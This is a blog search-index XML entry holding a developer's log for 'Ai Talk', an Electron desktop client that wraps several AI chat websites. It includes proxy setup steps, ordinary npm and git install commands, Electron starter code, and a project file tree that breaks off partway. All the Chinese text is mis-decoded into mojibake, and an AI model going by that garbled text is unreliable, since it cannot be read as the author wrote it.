<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>åº”ç”¨å¼€å‘- Ai Talk åº”ç”¨å¼€å‘æµç¨‹è®°å½•æ–‡æ¡£</title>
      <link href="/2025/01/21/Ai%20Talk%20%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/"/>
      <url>/2025/01/21/Ai%20Talk%20%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>Ai Talk é¡¹ç›®æ˜¯æ ¹æ®ä¸ªäººä½¿ç”¨ä¹ æƒ¯ç¼–å†™çš„ä¸€æ¬¾æ¬¾å¹³å°çš„ AI å¤§æ¨¡å‹å¯¹è¯å®¢æˆ·ç«¯åº”ç”¨ã€‚å¯åˆ©ç”¨è¯¥æ¡†æ¶æ„å»ºä»»ä½•å±äºè‡ªå·±çš„è·¨å¹³å°å®¢æˆ·ç«¯ï¼Œå› ä¸ºæœ¬è´¨ä¸Šåªæ˜¯å°† Web åº”ç”¨å°è£…æˆå®¢æˆ·ç«¯ã€‚</p><blockquote><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/Funsiooo/Ai-Talk">https://github.com/Funsiooo/Ai-Talk</a></p></blockquote><h2 id="äºŒã€ç¨‹åºä»‹ç»"><a href="#äºŒã€ç¨‹åºä»‹ç»" class="headerlink" title="äºŒã€ç¨‹åºä»‹ç»"></a>äºŒã€ç¨‹åºä»‹ç»</h2><h3 id="2-1-ç®€ä»‹"><a href="#2-1-ç®€ä»‹" class="headerlink" title="2.1 ç®€ä»‹"></a>2.1 ç®€ä»‹</h3><p><strong>Ai Talk</strong> æ˜¯ä¸€æ¬¾é›†åˆäº†å¤šç§å¤§è¯­è¨€æ¨¡å‹åº”ç”¨çš„å¼€æºæ¡Œé¢å®¢æˆ·ç«¯ï¼ŒåŸºäº Electron æ„å»ºã€‚Electron æ˜¯ä¸€ä¸ªç”± GitHub å¼€å‘çš„å¼€æºæ¡†æ¶ï¼Œç”¨äºæ„å»ºè·¨å¹³å°çš„æ¡Œé¢åº”ç”¨ç¨‹åºã€‚å®ƒé€šè¿‡ç»“åˆ <strong>Chromium</strong> æµè§ˆå™¨å¼•æ“å’Œ <strong>Node.js</strong> è¿è¡Œæ—¶ç¯å¢ƒï¼Œå…è®¸å¼€å‘è€…ä½¿ç”¨ <strong>HTMLã€CSS å’Œ JavaScript</strong> ç­‰å‰ç«¯æŠ€æœ¯å¼€å‘æ¡Œé¢åº”ç”¨ï¼ŒåŒæ—¶æ”¯æŒè°ƒç”¨åº•å±‚ç³»ç»ŸåŠŸèƒ½ï¼ˆå¦‚æ–‡ä»¶ç³»ç»Ÿã€ç³»ç»Ÿé€šçŸ¥ç­‰ï¼‰ã€‚å½“å‰æ”¯æŒä»¥ä¸‹å¤§æ¨¡å‹ï¼šOpenAI ChatGPTã€Google Geminiã€Quora Poeã€æœˆä¹‹æš—é¢ Kimiã€å­—èŠ‚ è±†åŒ…ã€é˜¿é‡Œ é€šä¹‰åƒé—®ã€è…¾è®¯ å…ƒå®ã€ç™¾åº¦ æ–‡å¿ƒä¸€è¨€ã€‚ </p><blockquote><p>ğŸ“‘   <strong>Noteï¼š</strong> OpenAi ChatGPTã€Google Gemini ã€Quora Poe éœ€è¦è®¾ç½®ç½‘ç»œä»£ç†æ‰èƒ½æ­£å¸¸è®¿é—®ï¼ˆå›½å¤–å‹äººåˆ™æ— éœ€ä»£ç†ï¼‰ã€‚</p></blockquote><h3 id="2-2-åŠŸèƒ½ä»‹ç»"><a href="#2-2-åŠŸèƒ½ä»‹ç»" class="headerlink" title="2.2 åŠŸèƒ½ä»‹ç»"></a>2.2 åŠŸèƒ½ä»‹ç»</h3><p><strong>ç•Œé¢ï¼š</strong> ç¨‹åºä¸»è¦ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šå·¦ä¾§çš„ä¾§è¾¹æ å’Œå³ä¾§çš„æ˜¾ç¤ºåŒºåŸŸã€‚ç‚¹å‡»å·¦ä¾§çš„æŸä¸ªå¤§æ¨¡å‹ï¼Œå³ä¾§å°†åŠ è½½è¯¥å¤§æ¨¡å‹çš„å®˜æ–¹é¡µé¢ï¼Œå³å¯å¼€å§‹å¯¹è¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/example1.png" data-caption="example1"><img src="/../images/ai/ai_talk/example1.png" alt="example1"></a></p><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/example2.png" data-caption="example2"><img src="/../images/ai/ai_talk/example2.png" alt="example2"></a></p><p><strong>ç½‘ç»œä»£ç†ï¼š</strong> ç”±äº <strong>OpenAI ChatGPT</strong> ã€ <strong>Google Gemini</strong> ã€<strong>Quora Poe</strong> æ¨¡å‹éœ€è¦è®¿é—®å›½å¤–ç½‘ç«™ï¼Œå› æ­¤åœ¨ä½¿ç”¨ä¹‹å‰ï¼Œéœ€è¦åœ¨å·¦ä¾§ä¾§è¾¹æ ä¸‹æ–¹çš„ â€œç½‘ç»œè®¾ç½®â€ ä¸­é…ç½®ä»£ç†ç½‘ç»œã€‚ç›®å‰åªæ”¯æŒ <strong>HTTP</strong> å’Œ <strong>HTTPS</strong> åè®®ã€‚é…ç½®æ­¥éª¤å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1ï¼‰ç‚¹å‡» â€œç½‘ç»œè®¾ç½®â€ ï¼Œåœ¨å¼¹çª—è¾“å…¥ä»£ç†åœ°å€ï¼Œå¦‚ï¼šæœ¬åœ°å¼€å¯äº† 7890 ç«¯å£ä¸ºä»£ç†ç½‘ç»œç«¯å£ï¼Œå¡«å…¥ http://127.0.0.1:7890 </span><br><span class="line">2ï¼‰ç‚¹å‡» â€œè®¾ç½®ä»£ç†â€ ï¼Œå®Œæˆç½‘ç»œè®¾ç½®</span><br><span class="line">3ï¼‰å¦‚ç½‘ç»œè®¾ç½®è¾“å…¥é”™è¯¯ï¼Œç‚¹å‡» â€œæ¸…é™¤ä»£ç†â€ å³å¯æ¢å¤ç¨‹åºé»˜è®¤è®¾ç½®</span><br><span class="line">4ï¼‰è®¾ç½®å®Œæ¯•åç‚¹å‡» â€œå…³é—­â€ </span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/example3.png" data-caption="example3"><img src="/../images/ai/ai_talk/example3.png" alt="example3"></a></p><h3 id="2-3-å¤§æ¨¡å‹ä½¿ç”¨è§„åˆ™"><a href="#2-3-å¤§æ¨¡å‹ä½¿ç”¨è§„åˆ™" class="headerlink" title="2.3 å¤§æ¨¡å‹ä½¿ç”¨è§„åˆ™"></a>2.3 å¤§æ¨¡å‹ä½¿ç”¨è§„åˆ™</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">| æ¨¡å‹åç§°        | ä½¿ç”¨è§„åˆ™                                                     |</span><br><span class="line">| -------------- | ------------------------------------------------------------ |</span><br><span class="line">| æœˆä¹‹æš—é¢ Kimi   | æ¶ˆæ¯æ¡æ•°é™åˆ¶ï¼šå…è´¹ä½¿ç”¨ï¼Œä¸é™æ¬¡æ•°ã€‚                           |</span><br><span class="line">| é€šä¹‰åƒé—®        | æ¶ˆæ¯æ¡æ•°é™åˆ¶ï¼šå…è´¹ä½¿ç”¨ï¼Œä¸é™æ¬¡æ•°ã€‚                           |</span><br><span class="line">| å­—èŠ‚ è±†åŒ…       | æ¶ˆæ¯æ¡æ•°é™åˆ¶ï¼šå…è´¹ä½¿ç”¨ï¼Œä¸é™æ¬¡æ•°ã€‚                           |</span><br><span class="line">| è…¾è®¯ å…ƒå®       | æ¶ˆæ¯æ¡æ•°é™åˆ¶ï¼šå…è´¹ä½¿ç”¨ï¼Œä¸é™æ¬¡æ•°ã€‚                           |</span><br><span class="line">| ç™¾åº¦ æ–‡å¿ƒä¸€è¨€    | æ¶ˆæ¯æ¡æ•°é™åˆ¶ï¼š3.5 æ¨¡å‹å…è´¹ä½¿ç”¨ï¼Œå…¶å®ƒæ¨¡å‹å­˜åœ¨æ¬¡æ•°é™åˆ¶ã€‚         |</span><br><span class="line">| OpenAi ChatGPT | æ¶ˆæ¯æ¡æ•°é™åˆ¶ï¼šå…è´¹å¥—é¤ç”¨æˆ·åœ¨ 5 å°æ—¶å†…åªèƒ½ä½¿ç”¨ GPT-4o çš„æœ‰é™æ¬¡æ•°ï¼Œä½¿ç”¨å®Œæ¯•å›é€€å…¶å®ƒæ¨¡å‹ï¼Œå¦‚ï¼šGPT-3.5 ã€‚ã€ å®˜æ–¹æ–‡æ¡£é“¾æ¥ï¼šhttps://help.openai.com/en/articles/9275245-using-chatgpt-s-free-tier-faq#h_43513320b9ã€‘ |</span><br><span class="line">| Google  Gemini | æ¶ˆæ¯æ¡æ•°é™åˆ¶ï¼š1.5 flash å…è´¹ä½¿ç”¨ï¼Œå­˜åœ¨æ¬¡æ•°é™é¢ï¼Œé™é¢ä¸è¯¦ã€‚ã€å®˜æ–¹æ–‡æ¡£ï¼šhttps://gemini.google.com/faqã€‘ |</span><br><span class="line">| Quora Poe      | æ¶ˆæ¯æ¡æ•°é™åˆ¶ï¼šå­˜åœ¨æ¬¡æ•°é™é¢ï¼Œé™é¢ä¸è¯¦ã€‚                       |</span><br></pre></td></tr></table></figure></div><h3 id="2-4-æºç å¯åŠ¨"><a href="#2-4-æºç å¯åŠ¨" class="headerlink" title="2.4 æºç å¯åŠ¨"></a>2.4 æºç å¯åŠ¨</h3><ul><li>å®‰è£… nodejs</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://nodejs.org/zh-cn/download</span><br></pre></td></tr></table></figure></div><ul><li>ä¸‹è½½é¡¹ç›®æºç </li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Funsiooo/Ai-Talk.git</span><br></pre></td></tr></table></figure></div><ul><li>å®‰è£… electron</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Ai-Talk</span><br><span class="line">npm install electron --save-dev -d --registry=https://registry.npmmirror.com</span><br></pre></td></tr></table></figure></div><ul><li>Ai Talk ç›®å½•ä¸‹æ‰§è¡Œ</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm start</span><br></pre></td></tr></table></figure></div><h3 id="2-5-æ‰“åŒ…"><a href="#2-5-æ‰“åŒ…" class="headerlink" title="2.5 æ‰“åŒ…"></a>2.5 æ‰“åŒ…</h3><ul><li>å®‰è£… node.js</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://nodejs.org/zh-cn/download</span><br></pre></td></tr></table></figure></div><ul><li>ä¸‹è½½é¡¹ç›®æºç </li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Funsiooo/Ai-Talk.git</span><br></pre></td></tr></table></figure></div><ul><li>å®‰è£… electron</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Ai-Talk</span><br><span class="line">npm install electron --save-dev -d --registry=https://registry.npmmirror.com</span><br></pre></td></tr></table></figure></div><ul><li>å®‰è£… electron-forge&#x2F;cli</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev @electron-forge/cli -d --registry=https://registry.npmmirror.com</span><br></pre></td></tr></table></figure></div><ul><li>macos å®‰è£… @electron-forge&#x2F;maker-dmg</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev  -d @electron-forge/maker-dmg --registry=https://registry.npmmirror.com</span><br></pre></td></tr></table></figure></div><ul><li>Ai Talk ç›®å½•ä¸‹æ‰§è¡Œï¼Œæ‰“åŒ…æ–‡ä»¶å­˜æ”¾åœ¨ out ç›®å½•ä¸‹ï¼ˆæ‰“åŒ…è¿‡ç¨‹ä¸­è‹¥å‡ºç°æŠ¥é”™å¯å¿½ç•¥ï¼‰</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure></div><blockquote><p>ğŸ“‘   <strong>Noteï¼š</strong> è‡ªè¡Œæ‰“åŒ…éœ€è¦æ ¹æ®è‡ªèº«è®¾å¤‡æ›¿æ¢é¡¹ç›®ä¸­çš„ package.json æ–‡ä»¶, ç›®å‰æä¾› <strong>Mac Apple silicon</strong>ã€<strong>Windows</strong> æ‰“åŒ…æ–‡ä»¶, æ–‡ä»¶è§ config æ–‡ä»¶å¤¹ã€‚</p></blockquote><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/build.png" data-caption="build"><img src="/../images/ai/ai_talk/build.png" alt="build"></a></p><h2 id="ä¸‰ã€å¼€å‘æµç¨‹"><a href="#ä¸‰ã€å¼€å‘æµç¨‹" class="headerlink" title="ä¸‰ã€å¼€å‘æµç¨‹"></a>ä¸‰ã€å¼€å‘æµç¨‹</h2><h3 id="3-1-Electron-å®‰è£…"><a href="#3-1-Electron-å®‰è£…" class="headerlink" title="3.1 Electron å®‰è£…"></a>3.1 Electron å®‰è£…</h3><h4 id="3-1-1-Node-å®‰è£…"><a href="#3-1-1-Node-å®‰è£…" class="headerlink" title="3.1.1 Node å®‰è£…"></a>3.1.1 Node å®‰è£…</h4><blockquote><p> macOS ä½¿ç”¨ brew å®‰è£…ï¼Œwin ç›´æ¥å®˜ç½‘ä¸‹è½½å®‰è£…å³å¯</p></blockquote><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">brew install node</span><br><span class="line"></span><br><span class="line">funsiooo@macbook-pro ~ % node -v</span><br><span class="line">v23.3.0</span><br><span class="line">funsiooo@macbook-pro ~ % npm -v </span><br><span class="line">10.9.0</span><br></pre></td></tr></table></figure></div><h4 id="3-1-2-åˆå§‹åŒ–-Electron-é¡¹ç›®"><a href="#3-1-2-åˆå§‹åŒ–-Electron-é¡¹ç›®" class="headerlink" title="3.1.2 åˆå§‹åŒ– Electron é¡¹ç›®"></a>3.1.2 åˆå§‹åŒ– Electron é¡¹ç›®</h4><p>1ï¼‰åˆ›å»ºé¡¹ç›®ç›®å½•,ä½¿ç”¨ npm åˆå§‹åŒ–é¡¹ç›®</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir Ai_Talk</span><br><span class="line">cd Ai_Talk</span><br><span class="line">npm init -y</span><br></pre></td></tr></table></figure></div><p>2ï¼‰é¡¹ç›®ä¸­å®‰è£… Electronï¼Œå¯èƒ½ä¼šå­˜åœ¨ç½‘ç»œé—®é¢˜ï¼Œå»ºè®® npm è®¾ç½®å›½å†…æºï¼Œæœ‰æ¡ä»¶ä»£ç†çš„ç›´æ¥å…¨å±€ä»£ç†</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1ï¼‰è®¾ç½® npm æº</span><br><span class="line">npm config set registry https://registry.npmmirror.com# ä½¿ç”¨æ·˜å®é•œåƒ</span><br><span class="line">npm config set registry https://registry.npmjs.org# æ¢å¤å›é»˜è®¤çš„ npm å®˜æ–¹é•œåƒ</span><br><span class="line"></span><br><span class="line">2ï¼‰electron å®‰è£…ï¼Œé€‰å½“å‰ç›®å½•ä¸‹å®‰è£…å³å¯</span><br><span class="line">npm install electron --save-dev-d# åœ¨åˆ›å»ºçš„é¡¹ç›®æ–‡ä»¶å¤¹å†…å®‰è£…</span><br><span class="line">npm install -g electron -d# å…¨å±€å®‰è£…ï¼Œå³å®‰è£…åœ¨æœ¬çº§ä¸Š</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/build2.png" data-caption="build"><img src="/../images/ai/ai_talk/build2.png" alt="build"></a></p><p>3ï¼‰æ„å»ºç¬¬ä¸€ä¸ªç¨‹åº</p><p>å®˜æ–¹æ•™ç¨‹ï¼š<a href="https://www.electronjs.org/zh/docs/latest/tutorial/tutorial-first-app">https://www.electronjs.org/zh/docs/latest/tutorial/tutorial-first-app</a> , é¡¹ç›®æ–‡ä»¶å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€â”€ index.html              # ä¸»é¡µé¢</span><br><span class="line">â”œâ”€â”€ main.js                 # ä¸»è¿›ç¨‹å…¥å£æ–‡ä»¶</span><br><span class="line">â”œâ”€â”€ node_modules            # Electron é¡¹ç›®ä¾èµ–</span><br><span class="line">â”œâ”€â”€ package-lock.json       # NPM é”å®šæ–‡ä»¶</span><br><span class="line">â””â”€â”€ package.json            # é¡¹ç›®ä¾èµ–åŠå…ƒæ•°æ®</span><br></pre></td></tr></table></figure></div><blockquote><p>index.html</p></blockquote><div class="highlight-wrap" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span></span></span><br><span class="line"><span class="tag">      <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span></span></span><br><span class="line"><span class="tag">      <span class="attr">http-equiv</span>=<span class="string">&quot;X-Content-Security-Policy&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello from Electron renderer!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello from Electron renderer!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>ğŸ‘‹<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;info&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./renderer.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p> main.js</p></blockquote><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; app, <span class="title class_">BrowserWindow</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">createWindow</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> win = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="number">800</span>,</span><br><span class="line">    <span class="attr">height</span>: <span class="number">600</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  win.<span class="title function_">loadFile</span>(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">whenReady</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">createWindow</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div><blockquote><p>package.json</p></blockquote><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;my-electron-app&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hello World!&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron .&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Jane Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MIT&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;electron&quot;</span><span class="punctuation">:</span> <span class="string">&quot;23.1.3&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>å¯åŠ¨ç¨‹åº</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run start</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/build3.png" data-caption="build"><img src="/../images/ai/ai_talk/build3.png" alt="build"></a></p><h3 id="3-2-æœ¬é¡¹ç›®å¼€å‘æµç¨‹"><a href="#3-2-æœ¬é¡¹ç›®å¼€å‘æµç¨‹" class="headerlink" title="3.2 æœ¬é¡¹ç›®å¼€å‘æµç¨‹"></a>3.2 æœ¬é¡¹ç›®å¼€å‘æµç¨‹</h3><h4 id="3-2-1-é¡¹ç›®æ–‡ä»¶æ ‘"><a href="#3-2-1-é¡¹ç›®æ–‡ä»¶æ ‘" class="headerlink" title="3.2.1 é¡¹ç›®æ–‡ä»¶æ ‘"></a>3.2.1 é¡¹ç›®æ–‡ä»¶æ ‘</h4><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Ai-Talk/                     # é¡¹ç›®æ ¹ç›®å½•</span><br><span class="line">â”œâ”€â”€ LICENSE                  # å¼€æºè®¸å¯è¯</span><br><span class="line">â”œâ”€â”€ README.md                # é¡¹ç›®è¯´æ˜æ–‡æ¡£</span><br><span class="line">â”œâ”€â”€ assets/                  # é™æ€èµ„æºç›®å½•</span><br><span class="line">â”œâ”€â”€ config/                  # æ‰“åŒ…æ–‡ä»¶ç›®å½•</span><br><span class="line">â”‚   â”œâ”€â”€ macos/               # macOS å¹³å°æ‰“åŒ…é…ç½®æ–‡ä»¶ç›®å½•</span><br><span class="line">â”‚   â”‚   â””â”€â”€ package.json     # macOS å¹³å°æ‰“åŒ…é…ç½®æ–‡ä»¶</span><br><span class="line">â”‚   â””â”€â”€ windows/             # Windows å¹³å°æ‰“åŒ…é…ç½®æ–‡ä»¶ç›®å½•</span><br><span class="line">â”‚       â”œâ”€â”€ css.zip          # æ ·å¼å‹ç¼©åŒ…ï¼Œmacä¸windowsæ ·å¼å·®å¼‚ï¼Œwinæ‰“åŒ…å¯æ›¿æ¢è¯¥css</span><br><span class="line">â”‚       â””â”€â”€ package.json     # Windows å¹³å°æ‰“åŒ…é…ç½®æ–‡ä»¶</span><br><span class="line">â”œâ”€â”€ doc/                     # æ–‡æ¡£ç›®å½•</span><br><span class="line">â”‚   â””â”€â”€ README_EN.md         # è‹±æ–‡é¡¹ç›®è¯´æ˜æ–‡æ¡£</span><br><span class="line">â”œâ”€â”€ forge.config.js          # Electron Forge é…ç½®æ–‡ä»¶</span><br><span class="line">â”œâ”€â”€ main.js                  # ä¸»è¿›ç¨‹å…¥å£æ–‡ä»¶</span><br><span class="line">â”œâ”€â”€ 